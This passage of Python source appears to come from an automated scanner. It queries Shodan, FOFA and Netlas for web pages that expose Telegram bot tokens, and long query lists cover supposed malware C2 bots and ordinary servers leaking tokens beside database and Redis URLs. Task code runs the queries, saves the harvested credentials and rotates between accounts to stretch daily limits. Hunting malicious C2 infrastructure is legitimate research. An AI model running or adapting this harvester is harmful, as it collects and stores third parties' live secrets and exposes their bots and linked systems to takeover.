    result_msg = f"Shodan C2 scan finished. Saved {total_saved} new credentials."
    if errors:
        result_msg += f" (Errors: {len(errors)})"
    await _send_log_async(f"🏁 [Shodan-C2] Finished. Saved {total_saved} credentials from C2 infrastructure.")
    return result_msg


def _shodan_body_query(anchor: str, extra: str = "") -> str:
    """Build a Shodan body query with standard exclusion filters and status check.

    Centralises the exclusion-filter suffix so it cannot be omitted from new entries.
    Every query produced by this helper contains both exclusion strings and http.status:200.
    """
    parts = [anchor]
    if extra:
        parts.append(extra)
    parts += ['-http.body:"telegram.org"', '-http.body:"github.com"', "http.status:200"]
    return " ".join(parts)


# ── Shodan default query list ─────────────────────────────────────────────────
# Replaces the inline default_queries construction in _scan_shodan_async.
# Ordered by tier: Tier 1 (standalone fingerprints), Tier 2 (C2 payload variants),
# Tier 3 (malware keywords), then legacy http.html:/http.title: entries.
SHODAN_DEFAULT_QUERIES = [
    # ── Tier 1: Standalone Telegram fingerprint queries ───────────────────
    'http.headers:"X-Telegram-Bot-Api"',
    'http.body:"api.telegram.org/bot" -http.body:"telegram.org" -http.body:"github.com" http.status:200',
    'http.body:"http://t.me/bot" -http.body:"telegram.org" -http.body:"github.com" http.status:200',
    'http.body:"https://t.me" http.body:"/start" -http.body:"telegram.org" -http.body:"github.com" http.status:200',
    # ── Tier 2: C2 payload queries (anchored to api.telegram.org/bot) ─────
    'http.body:"api.telegram.org/bot" http.body:"/start payload=" -http.body:"telegram.org" -http.body:"github.com" http.status:200',
    'http.body:"api.telegram.org/bot" http.body:"/start token=" -http.body:"telegram.org" -http.body:"github.com" http.status:200',
    'http.body:"api.telegram.org/bot" http.body:"/start cmd=" -http.body:"telegram.org" -http.body:"github.com" http.status:200',
    'http.body:"api.telegram.org/bot" http.body:"/start c2=" -http.body:"telegram.org" -http.body:"github.com" http.status:200',
    'http.body:"api.telegram.org/bot" http.body:"/start key=" -http.body:"telegram.org" -http.body:"github.com" http.status:200',
    'http.body:"api.telegram.org/bot" http.body:"/start id=" -http.body:"telegram.org" -http.body:"github.com" http.status:200',
    'http.body:"api.telegram.org/bot" http.body:"/start /bin/bash" -http.body:"telegram.org" -http.body:"github.com" http.status:200',
    'http.body:"api.telegram.org/bot" http.body:"/start /powershell" -http.body:"telegram.org" -http.body:"github.com" http.status:200',
    'http.body:"api.telegram.org/bot" http.body:"/start download" -http.body:"telegram.org" -http.body:"github.com" http.status:200',
    'http.body:"api.telegram.org/bot" http.body:"/start /exec" -http.body:"telegram.org" -http.body:"github.com" http.status:200',
    'http.body:"api.telegram.org/bot" http.body:"/start /run" -http.body:"telegram.org" -http.body:"github.com" http.status:200',
    'http.body:"api.telegram.org/bot" http.body:"/start /invoke" -http.body:"telegram.org" -http.body:"github.com" http.status:200',
    'http.body:"api.telegram.org/bot" http.body:"/start /script" -http.body:"telegram.org" -http.body:"github.com" http.status:200',
    'http.body:"api.telegram.org/bot" http.body:"/start http://" -http.body:"telegram.org" -http.body:"github.com" http.status:200',
    'http.body:"api.telegram.org/bot" http.body:"/start https://" -http.body:"telegram.org" -http.body:"github.com" http.status:200',
    # ── Tier 3: Malware keyword queries (anchored to api.telegram.org/bot) ─
    'http.body:"api.telegram.org/bot" http.body:"malware" -http.body:"telegram.org" -http.body:"github.com" http.status:200',
    'http.body:"api.telegram.org/bot" http.body:"rat" -http.body:"telegram.org" -http.body:"github.com" http.status:200',
    'http.body:"api.telegram.org/bot" http.body:"remote access" -http.body:"telegram.org" -http.body:"github.com" http.status:200',
    'http.body:"api.telegram.org/bot" http.body:"spyware" -http.body:"telegram.org" -http.body:"github.com" http.status:200',
    'http.body:"api.telegram.org/bot" http.body:"stealer" -http.body:"telegram.org" -http.body:"github.com" http.status:200',
    'http.body:"api.telegram.org/bot" http.body:"keylogger" -http.body:"telegram.org" -http.body:"github.com" http.status:200',
    'http.body:"api.telegram.org/bot" http.body:"c2 server" -http.body:"telegram.org" -http.body:"github.com" http.status:200',
    'http.body:"api.telegram.org/bot" http.body:"command and control" -http.body:"telegram.org" -http.body:"github.com" http.status:200',
    'http.body:"api.telegram.org/bot" http.body:"exploit" -http.body:"telegram.org" -http.body:"github.com" http.status:200',
    'http.body:"api.telegram.org/bot" http.body:"bypass" -http.body:"telegram.org" -http.body:"github.com" http.status:200',
    'http.body:"api.telegram.org/bot" http.body:"inject" -http.body:"telegram.org" -http.body:"github.com" http.status:200',
    'http.body:"api.telegram.org/bot" http.body:"persistence" -http.body:"telegram.org" -http.body:"github.com" http.status:200',
    'http.body:"api.telegram.org/bot" http.body:"privilege escalation" -http.body:"telegram.org" -http.body:"github.com" http.status:200',
    # ── Legacy http.html: / http.title: entries (retained unchanged) ──────
    'http.html:"api.telegram.org/bot"',
    'http.html:"bot_token"',
    'http.html:"TELEGRAM_BOT_TOKEN"',
    'http.html:"TELEGRAM_TOKEN"',
    'http.html:"Telegram Bot"',
    'http.html:"https://api.telegram.org"',
    'http.title:"Telegram Bot"',
    'http.title:"Telegram Login"',
]


# ── FOFA default query list ───────────────────────────────────────────────────
# Replaces the inline COMMON_QUERIES construction in _scan_fofa_async.
# Ordered by tier: existing entries first, then Tier 1 t.me, Tier 2 C2 payloads, Tier 3 malware.
# FOFA does not support negation in the same way as Shodan/Netlas; exclusions are omitted.
FOFA_DEFAULT_QUERIES = [
    # ── Existing entries (retained unchanged, status_code="200" added where missing) ──
    'body="api.telegram.org/bot" && status_code="200"',
    'body="bot_token" && status_code="200"',
    'body="TELEGRAM_BOT_TOKEN" && status_code="200"',
    'title="Telegram Bot" && status_code="200"',
    'body="sendMessage" && body="chat_id" && status_code="200"',
    # ── Tier 1: t.me URL pattern queries ─────────────────────────────────
    'body="http://t.me/bot" && status_code="200"',
    'body="https://t.me" && body="/start" && status_code="200"',
    # ── Tier 2: C2 payload queries (anchored to api.telegram.org/bot) ────
    'body="/start payload=" && body="api.telegram.org/bot" && status_code="200"',
    'body="/start token=" && body="api.telegram.org/bot" && status_code="200"',
    'body="/start cmd=" && body="api.telegram.org/bot" && status_code="200"',
    'body="/start c2=" && body="api.telegram.org/bot" && status_code="200"',
    'body="/start key=" && body="api.telegram.org/bot" && status_code="200"',
    'body="/start id=" && body="api.telegram.org/bot" && status_code="200"',
    'body="/start /bin/bash" && body="api.telegram.org/bot" && status_code="200"',
    'body="/start /powershell" && body="api.telegram.org/bot" && status_code="200"',
    'body="/start download" && body="api.telegram.org/bot" && status_code="200"',
    'body="/start /exec" && body="api.telegram.org/bot" && status_code="200"',
    'body="/start /run" && body="api.telegram.org/bot" && status_code="200"',
    'body="/start /invoke" && body="api.telegram.org/bot" && status_code="200"',
    'body="/start /script" && body="api.telegram.org/bot" && status_code="200"',
    'body="/start http://" && body="api.telegram.org/bot" && status_code="200"',
    'body="/start https://" && body="api.telegram.org/bot" && status_code="200"',
    # ── Tier 3: Malware keyword queries (anchored to api.telegram.org/bot) ─
    'body="malware" && body="api.telegram.org/bot" && status_code="200"',
    'body="rat" && body="api.telegram.org/bot" && status_code="200"',
    'body="remote access" && body="api.telegram.org/bot" && status_code="200"',
    'body="spyware" && body="api.telegram.org/bot" && status_code="200"',
    'body="stealer" && body="api.telegram.org/bot" && status_code="200"',
    'body="keylogger" && body="api.telegram.org/bot" && status_code="200"',
    'body="c2 server" && body="api.telegram.org/bot" && status_code="200"',
    'body="command and control" && body="api.telegram.org/bot" && status_code="200"',
    'body="exploit" && body="api.telegram.org/bot" && status_code="200"',
    'body="bypass" && body="api.telegram.org/bot" && status_code="200"',
    'body="inject" && body="api.telegram.org/bot" && status_code="200"',
    'body="persistence" && body="api.telegram.org/bot" && status_code="200"',
    'body="privilege escalation" && body="api.telegram.org/bot" && status_code="200"',
]


# ── Shared query bank ─────────────────────────────────────────────────────────
# All Netlas queries live here. Ordered by expected yield (highest first).
# Each query costs 1 search coin. With 100 req/day across both accounts,
# we run the top N queries that fit within the remaining daily budget.
NETLAS_QUERIES = [
    # ── Direct token in HTTP body (highest yield) ─────────────────────────
    'http.body:"api.telegram.org/bot" http.status_code:200 NOT http.body:"telegram.org" NOT http.body:"github.com"',
    'http.body:"TELEGRAM_BOT_TOKEN" http.status_code:200 NOT http.body:"telegram.org" NOT http.body:"github.com"',
    'http.body:"bot_token" http.body:"api.telegram.org" http.status_code:200 NOT http.body:"telegram.org" NOT http.body:"github.com"',
    'http.body:"TG_BOT_TOKEN" http.status_code:200 NOT http.body:"telegram.org" NOT http.body:"github.com"',
    # ── Telegram header fingerprint ───────────────────────────────────────
    'http.headers:"X-Telegram-Bot-Api"',
    # ── C2 / RAT / Malware bots ───────────────────────────────────────────
    'http.body:"api.telegram.org/bot" http.body:"malware" http.status_code:200 NOT http.body:"telegram.org" NOT http.body:"github.com"',
    'http.body:"api.telegram.org/bot" http.body:"rat" http.status_code:200 NOT http.body:"telegram.org" NOT http.body:"github.com"',
    'http.body:"api.telegram.org/bot" http.body:"stealer" http.status_code:200 NOT http.body:"telegram.org" NOT http.body:"github.com"',
    'http.body:"api.telegram.org/bot" http.body:"keylogger" http.status_code:200 NOT http.body:"telegram.org" NOT http.body:"github.com"',
    'http.body:"api.telegram.org/bot" http.body:"c2" http.status_code:200 NOT http.body:"telegram.org" NOT http.body:"github.com"',
    'http.body:"api.telegram.org/bot" http.body:"remote access" http.status_code:200 NOT http.body:"telegram.org" NOT http.body:"github.com"',
    'http.body:"api.telegram.org/bot" http.body:"exploit" http.status_code:200 NOT http.body:"telegram.org" NOT http.body:"github.com"',
    'http.body:"api.telegram.org/bot" http.body:"inject" http.status_code:200 NOT http.body:"telegram.org" NOT http.body:"github.com"',
    'http.body:"api.telegram.org/bot" http.body:"persistence" http.status_code:200 NOT http.body:"telegram.org" NOT http.body:"github.com"',
    'http.body:"api.telegram.org/bot" http.body:"privilege escalation" http.status_code:200 NOT http.body:"telegram.org" NOT http.body:"github.com"',
    'http.body:"api.telegram.org/bot" http.body:"spyware" http.status_code:200 NOT http.body:"telegram.org" NOT http.body:"github.com"',
    'http.body:"api.telegram.org/bot" http.body:"bypass" http.status_code:200 NOT http.body:"telegram.org" NOT http.body:"github.com"',
    'http.body:"api.telegram.org/bot" http.body:"command and control" http.status_code:200 NOT http.body:"telegram.org" NOT http.body:"github.com"',
    # ── /start command C2 patterns ────────────────────────────────────────
    'http.body:"api.telegram.org/bot" http.body:"/start payload=" http.status_code:200 NOT http.body:"telegram.org" NOT http.body:"github.com"',
    'http.body:"api.telegram.org/bot" http.body:"/start token=" http.status_code:200 NOT http.body:"telegram.org" NOT http.body:"github.com"',
    'http.body:"api.telegram.org/bot" http.body:"/start cmd=" http.status_code:200 NOT http.body:"telegram.org" NOT http.body:"github.com"',
    'http.body:"api.telegram.org/bot" http.body:"/start c2=" http.status_code:200 NOT http.body:"telegram.org" NOT http.body:"github.com"',
    'http.body:"api.telegram.org/bot" http.body:"/start key=" http.status_code:200 NOT http.body:"telegram.org" NOT http.body:"github.com"',
    'http.body:"api.telegram.org/bot" http.body:"/start id=" http.status_code:200 NOT http.body:"telegram.org" NOT http.body:"github.com"',
    'http.body:"api.telegram.org/bot" http.body:"/start /bin/bash" http.status_code:200 NOT http.body:"telegram.org" NOT http.body:"github.com"',
    'http.body:"api.telegram.org/bot" http.body:"/start /powershell" http.status_code:200 NOT http.body:"telegram.org" NOT http.body:"github.com"',
    'http.body:"api.telegram.org/bot" http.body:"/start download" http.status_code:200 NOT http.body:"telegram.org" NOT http.body:"github.com"',
    'http.body:"api.telegram.org/bot" http.body:"/start /exec" http.status_code:200 NOT http.body:"telegram.org" NOT http.body:"github.com"',
    'http.body:"api.telegram.org/bot" http.body:"/start /run" http.status_code:200 NOT http.body:"telegram.org" NOT http.body:"github.com"',
    'http.body:"api.telegram.org/bot" http.body:"/start /invoke" http.status_code:200 NOT http.body:"telegram.org" NOT http.body:"github.com"',
    'http.body:"api.telegram.org/bot" http.body:"/start /script" http.status_code:200 NOT http.body:"telegram.org" NOT http.body:"github.com"',
    'http.body:"api.telegram.org/bot" http.body:"/start http://" http.status_code:200 NOT http.body:"telegram.org" NOT http.body:"github.com"',
    'http.body:"api.telegram.org/bot" http.body:"/start https://" http.status_code:200 NOT http.body:"telegram.org" NOT http.body:"github.com"',
    # ── Config file patterns exposed on web ───────────────────────────────
    'http.body:"TELEGRAM_BOT_TOKEN" http.body:"REDIS_URL" http.status_code:200 NOT http.body:"telegram.org" NOT http.body:"github.com"',
    'http.body:"TELEGRAM_BOT_TOKEN" http.body:"DATABASE_URL" http.status_code:200 NOT http.body:"telegram.org" NOT http.body:"github.com"',
    'http.body:"bot_token" http.body:"webhook" http.status_code:200 NOT http.body:"telegram.org" NOT http.body:"github.com"',
    # ── Telegram t.me patterns ────────────────────────────────────────────
    'http.body:"https://t.me" http.body:"/start" http.body:"api.telegram.org" http.status_code:200 NOT http.body:"telegram.org" NOT http.body:"github.com"',
    'http.body:"http://t.me/bot" http.status_code:200 NOT http.body:"telegram.org" NOT http.body:"github.com"',
]


@app.task(name="scanner.scan_netlas", autoretry_for=(Exception,), retry_backoff=True, max_retries=2)
def scan_netlas(query: str = None):
    """
    Netlas scan — runs once daily, respects per-account request limits.
    Rotates between account 1 (45 req/day) and account 2 (90 req/day).
    Queries are ordered by yield; stops when daily budget is exhausted.
    """
    return _run_sync(_scan_netlas_async(query))


async def _scan_netlas_async(query: str = None):
    if redis_client.get("system:paused"):
        return "System Paused"

    queries = [query] if query else NETLAS_QUERIES

    # Log current budget before starting
    usage = await netlas_srv.get_usage_summary()
    remaining = sum(v["remaining"] for v in usage.values())
    if remaining == 0:
        msg = "⏸️ [Netlas] Daily budget exhausted for all accounts — skipping"
        logger.warning(msg)
        await _send_log_async(msg)
        return "Daily limit reached"

    logger.info(f"🔍 [Netlas] Starting scan | Budget remaining: {remaining} requests | Queries: {len(queries)}")
    await _send_log_async(
        f"🔍 [Netlas] Starting scan ({remaining} requests remaining today, {len(queries)} queries queued)..."
    )

    total_saved = 0
    errors = []
    queries_run = 0

    for q in queries:
        # Re-check budget before each query
        usage = await netlas_srv.get_usage_summary()
        remaining = sum(v["remaining"] for v in usage.values())
        if remaining == 0:
            logger.warning("    [Netlas] Budget exhausted mid-scan — stopping early")
            await _send_log_async(f"⏸️ [Netlas] Budget exhausted after {queries_run} queries.")
            break

        try:
            logger.info(f"    🔎 [Netlas] Query: {q[:70]}...")
            results = await netlas_srv.search(q, size=20)
            logger.info(f"    ✅ [Netlas] Returned {len(results)} results")
            saved = await _save_credentials_async(results, "netlas")
            total_saved += saved
            queries_run += 1
            await asyncio.sleep(1)  # gentle rate limiting
        except Exception as e:
            logger.error(f"    ❌ [Netlas] Query failed: {e}")
            errors.append(str(e))
            errors = errors[-MAX_ERRORS_BUFFER:]

    # Final usage summary
    usage = await netlas_srv.get_usage_summary()
    usage_str = " | ".join(
        f"Acct#{k.split('_')[1]}: {v['used']}/{v['limit']}"
        for k, v in usage.items()
    )

    result_msg = f"Netlas scan finished. Ran {queries_run} queries, saved {total_saved} credentials."
    if errors:
        result_msg += f" (Errors: {len(errors)})"

    await _send_log_async(
        f"🏁 [Netlas] Finished. Saved {total_saved} credentials. Usage today: {usage_str}"
    )
    return result_msg
